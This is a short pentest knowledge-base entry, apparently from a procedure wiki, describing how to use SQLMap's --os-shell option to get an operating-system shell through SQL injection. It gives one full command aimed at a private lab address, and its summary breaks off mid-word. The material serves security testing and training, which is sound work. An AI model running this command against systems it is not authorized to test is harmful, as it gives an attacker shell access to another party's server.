---
id: 42eced5a-a4b1-4d71-b12b-6d02dd106b1e
name: Using SQLMap to Get OS Shell
type: procedure
verified: true
submitted: true
created_at: '2020-08-19T19:11:03.495734+00:00'
updated_at: '2023-05-26T18:21:56.730965+00:00'
platforms:
- Web
tags:
- '[[owasp]]'
- '[[owasp top 10]]'
- '[[SQL]]'
- '[[sqli]]'
- '[[SQL Injection]]'
- '[[SQLMap]]'
- '[[Web Applications]]'
commands:
- '[[SQLMap Command to Get OS Shell]]'
---

# Using SQLMap to Get OS Shell

**Status**: ✓ Verified

## Summary

SQLMap is an automated SQL Injection exploitation tool. This can be used to insert the SQL injection payloads through the application input fields. It is also possible to obtain the OS shell by running the SQLMap tool. --dbms is used to specify the database type, --os-shell to specify the access fo

## Description

# Description

SQLMap is an automated SQL Injection exploitation tool. This can be used to insert the SQL injection payloads through the application input fields. It is also possible to obtain the OS shell by running the SQLMap tool.

*--dbms is used to specify the database type, --os-shell to specify the access for OS Shell*



# Procedure

1. The below SQLMap command can be used to get the OS shell of the server on which the application is running.







**Command** ([[SQLMap Command to Get OS Shell]]):

```bash
sqlmap --dbms=mysql -u '192.168.43.68/vcart/search.php?term=' --os-shell
```







## Platforms

- Web

## Commands Used

- [[SQLMap Command to Get OS Shell]]

## Tags

- [[owasp]]
- [[owasp top 10]]
- [[SQL]]
- [[sqli]]
- [[SQL Injection]]
- [[SQLMap]]
- [[Web Applications]]


